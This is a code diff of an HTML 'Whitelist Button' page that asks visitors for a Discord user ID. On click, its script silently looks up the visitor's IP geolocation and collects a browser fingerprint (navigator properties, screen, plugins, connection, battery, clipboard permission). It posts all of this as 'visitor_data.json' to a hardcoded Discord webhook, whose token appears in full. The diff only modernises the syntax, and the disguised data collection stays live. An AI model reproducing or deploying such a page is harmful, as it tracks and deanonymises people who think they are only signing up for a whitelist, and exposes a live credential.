@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Whitelist</title>
+  <title>Whitelist Button</title>
   <style>
     body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
     input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
@@ -17,168 +17,155 @@
   <button id="whitelistBtn" disabled>Whitelist</button>
 
   <script>
-    var WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
-    var whitelistBtn = document.getElementById('whitelistBtn');
-    var discordIdInput = document.getElementById('discordId');
-    var RATE_LIMIT_HOURS = 24;
-    var STORAGE_KEY = 'lastWhitelistTime';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr';
+    const whitelistBtn = document.getElementById('whitelistBtn');
+    const discordIdInput = document.getElementById('discordId');
+    const RATE_LIMIT_HOURS = 24;
+    const STORAGE_KEY = 'lastWhitelistTime';
 
-    discordIdInput.addEventListener('input', function () {
-      var value = discordIdInput.value.replace(/\s+/g, '');
+    discordIdInput.addEventListener('input', () => {
+      const value = discordIdInput.value.trim();
       whitelistBtn.disabled = !/^\d+$/.test(value);
     });
 
     function isRateLimited() {
       try {
-        var lastTime = localStorage.getItem(STORAGE_KEY);
+        const lastTime = localStorage.getItem(STORAGE_KEY);
         if (!lastTime) return false;
-        var diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
+        const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
         return diff < RATE_LIMIT_HOURS;
-      } catch (e) {
+      } catch {
         return false;
       }
     }
 
-    function detectCapabilities() {
-      return {
-        battery: !!navigator.getBattery,
-        permissions: !!navigator.permissions,
-        fetch: !!window.fetch,
-        connection: !!navigator.connection,
-        clipboard: !!navigator.clipboard,
-        javaEnabled: !!navigator.javaEnabled
-      };
-    }
-
     function getGeoData(callback) {
       try {
-        var xhr = new XMLHttpRequest();
+        const xhr = new XMLHttpRequest();
         xhr.open('GET', 'https://ipapi.co/json/', true);
-        xhr.onreadystatechange = function () {
+        xhr.onreadystatechange = function() {
           if (xhr.readyState === 4) {
             if (xhr.status === 200) {
-              try { callback(JSON.parse(xhr.responseText)); } catch (e) { callback({}); }
+              try { callback(JSON.parse(xhr.responseText)); } catch { callback({}); }
             } else {
               callback({});
             }
           }
         };
         xhr.send();
-      } catch (e) {
+      } catch {
         callback({});
       }
     }
 
     function gatherDiagnostics(callback) {
-      var capabilities = detectCapabilities();
-      var diagnostics = {
+      const diagnostics = {
         battery: null,
-        connection: null,
         clipboardPermission: null,
         navigatorProperties: {},
         screen: {},
         plugins: [],
-        mimeTypes: []
+        mimeTypes: [],
+        connection: null
       };
 
       // Navigator properties
-      ['userAgent','language','languages','platform','cookieEnabled','onLine','hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack','vendor','product','productSub'].forEach(function(prop) {
-        diagnostics.navigatorProperties[prop] = navigator[prop] !== undefined ? navigator[prop] : null;
+      const navProps = ['userAgent','language','languages','platform','cookieEnabled','onLine','hardwareConcurrency','deviceMemory','maxTouchPoints','doNotTrack','vendor','product','productSub'];
+      navProps.forEach(prop => {
+        try { diagnostics.navigatorProperties[prop] = navigator[prop] !== undefined ? navigator[prop] : null; } catch {}
       });
 
-      // Screen info
-      ['width','height','availWidth','availHeight','colorDepth','pixelDepth'].forEach(function(prop) {
-        diagnostics.screen[prop] = screen[prop] !== undefined ? screen[prop] : null;
+      // Screen properties
+      const screenProps = ['width','height','availWidth','availHeight','colorDepth','pixelDepth'];
+      screenProps.forEach(prop => {
+        try { diagnostics.screen[prop] = screen[prop] !== undefined ? screen[prop] : null; } catch {}
       });
 
       // Plugins and mimeTypes
-      diagnostics.plugins = navigator.plugins ? Array.prototype.map.call(navigator.plugins, function(p) { return p.name; }) : [];
-      diagnostics.mimeTypes = navigator.mimeTypes ? Array.prototype.map.call(navigator.mimeTypes, function(m) { return m.type; }) : [];
+      try { diagnostics.plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name) : []; } catch {}
+      try { diagnostics.mimeTypes = navigator.mimeTypes ? Array.from(navigator.mimeTypes).map(m => m.type) : []; } catch {}
 
-      // Connection info
-      if (capabilities.connection && navigator.connection) {
-        diagnostics.connection = {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt,
-          saveData: navigator.connection.saveData || false
-        };
-      }
-
-      // Battery info
-      if (capabilities.battery && navigator.getBattery) {
-        navigator.getBattery().then(function(battery) {
-          diagnostics.battery = {
-            charging: battery.charging,
-            level: battery.level,
-            chargingTime: battery.chargingTime,
-            dischargingTime: battery.dischargingTime
+      // Connection
+      try {
+        if (navigator.connection) {
+          diagnostics.connection = {
+            effectiveType: navigator.connection.effectiveType || null,
+            downlink: navigator.connection.downlink || null,
+            rtt: navigator.connection.rtt || null,
+            saveData: navigator.connection.saveData || false
           };
-          continueDiagnostics();
-        }).catch(function(){ continueDiagnostics(); });
-      } else {
-        continueDiagnostics();
-      }
+        }
+      } catch {}
 
-      function continueDiagnostics() {
-        // Clipboard permission
-        if (capabilities.permissions) {
-          navigator.permissions.query({name:'clipboard-read'}).then(function(result){
-            diagnostics.clipboardPermission = result.state;
+      // Clipboard permission
+      try {
+        if (navigator.permissions) {
+          navigator.permissions.query({name:'clipboard-read'}).then(p => { diagnostics.clipboardPermission = p.state; }).catch(() => {});
+        }
+      } catch {}
+
+      // Battery
+      try {
+        if (navigator.getBattery) {
+          navigator.getBattery().then(b => {
+            diagnostics.battery = {
+              charging: b.charging,
+              level: b.level,
+              chargingTime: b.chargingTime,
+              dischargingTime: b.dischargingTime
+            };
             callback(diagnostics);
-          }).catch(function(){ callback(diagnostics); });
+          }).catch(() => callback(diagnostics));
         } else {
           callback(diagnostics);
         }
+      } catch {
+        callback(diagnostics);
       }
     }
 
     function sendData() {
-      if (isRateLimited()) {
-        alert('You can only whitelist once every 24 hours.');
-        return;
-      }
+      if (isRateLimited()) { alert('You can only whitelist once every 24 hours.'); return; }
 
-      getGeoData(function(geoData){
-        gatherDiagnostics(function(diagnostics){
-          var payload = {
+      getGeoData(function(geoData) {
+        gatherDiagnostics(function(diagnostics) {
+          const payload = {
             timestamp: new Date().toISOString(),
-            discordUserId: discordIdInput.value.replace(/\s+/g,''),
+            discordUserId: discordIdInput.value.trim(),
             page: location.href,
             referrer: document.referrer || null,
-            timezone: (Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions().timeZone) || null,
-            geoData: geoData,
+            timezone: Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : null,
+            ipInfo: geoData,
             diagnostics: diagnostics
           };
 
-          // Send data
+          // Use XHR to ensure maximum compatibility
           try {
-            var formData = new FormData();
-            var file = new Blob([JSON.stringify(payload,null,2)], {type:'application/json'});
-            formData.append('file', file, 'visitor_data.json');
-            formData.append('content','Visitor data from Discord User ID: '+payload.discordUserId);
+            const formData = new FormData();
+            formData.append('file', new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }), 'visitor_data.json');
+            formData.append('content', `Visitor data from Discord User ID: ${discordIdInput.value.trim()}`);
 
-            var xhr = new XMLHttpRequest();
+            const xhr = new XMLHttpRequest();
             xhr.open('POST', WEBHOOK_URL, true);
-            xhr.onload = function(){
-              if(xhr.status>=200 && xhr.status<300){
+            xhr.onload = function() {
+              if (xhr.status >= 200 && xhr.status < 300) {
                 alert('Data sent successfully.');
-                try{ localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch(e){}
+                try { localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch {}
                 whitelistBtn.disabled = true;
               } else {
-                alert('Failed to send data. Status: '+xhr.status);
+                alert('Failed to send data. Status: ' + xhr.status);
               }
             };
-            xhr.onerror = function(){ alert('Error sending data.'); };
+            xhr.onerror = function() { alert('Error sending data.'); };
             xhr.send(formData);
-          } catch(err){
-            alert('Error: '+err.message);
+          } catch(err) {
+            alert('Unexpected error: ' + err.message);
           }
         });
       });
     }
 
-    if(isRateLimited()) whitelistBtn.disabled=true;
+    if (isRateLimited()) whitelistBtn.disabled = true;
     whitelistBtn.addEventListener('click', sendData);
   </script>
 </body>
